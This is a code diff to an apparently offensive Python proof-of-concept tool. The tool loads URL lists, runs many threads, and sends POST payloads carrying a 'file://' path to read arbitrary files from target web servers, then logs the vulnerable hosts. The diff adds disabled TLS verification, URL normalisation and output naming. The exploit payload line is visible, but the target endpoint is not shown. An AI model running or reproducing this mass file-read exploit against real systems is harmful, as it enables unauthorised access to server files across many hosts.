@@ -65,7 +65,7 @@ class POC:
         parser.add_argument("-f", "--file", required=False, type=str, default=f"./url.txt", help=f"The url file, default is ./url.txt")
         parser.add_argument("-t", "--thread", required=False, type=int, default=32, help=f"Number of thread, default is 32")
         parser.add_argument("-T", "--timeout", required=False, type=int, default=3,  help="request timeout(default 3)")
-        parser.add_argument("-o", "--output", required=False, type=str, default=f"{date}.txt",  help=f"Vuln url output file, default is {date}.txt")
+        parser.add_argument("-o", "--output", required=False, type=str, default=date,  help=f"Vuln url output file, default is {date}.txt")
         return parser.parse_args()
 
     # 验证漏洞
@@ -110,7 +110,7 @@ class POC:
         }
         postData = 'var={"body":{"file":"file://' + filename + '"}}'
         try:
-            rep = requests.post(url=reqURL, headers=headers, data=postData, timeout=self.args.timeout)
+            rep = requests.post(url=reqURL, headers=headers, data=postData, timeout=self.args.timeout, verify=False)
             fileData = rep.text
             return fileData
         except:
@@ -119,11 +119,14 @@ class POC:
     # 加载url地址(带http://)
     def loadURL(self):
         urlList = []
-        with open(self.args.file) as f:
+        with open(self.args.file, encoding="utf8") as f:
             for line in f.readlines():
-                line = line.replace("http://", "") if "http://" in line else line
-                line = line.replace("https://", "") if "https://" in line else line
-                urlList.append(f"http://{line.strip()}")
+                line = line.strip()
+                if "https://" in line:
+                    line = line.replace("https://", "http://")
+                if "http://" not in line:
+                    line = f"http://{line}"
+                urlList.append(line)
         return urlList
 
     # 多线程运行
@@ -138,7 +141,7 @@ class POC:
     def output(self):
         if not os.path.isdir(r"./output"):
             os.mkdir(r"./output")
-        self.outputFile = f"./output/{self.args.output}"
+        self.outputFile = f"./output/{self.args.output}.txt"
         with open(self.outputFile, "a") as f:
             for url in self.vulnRULList:
                 f.write(url + "\n")
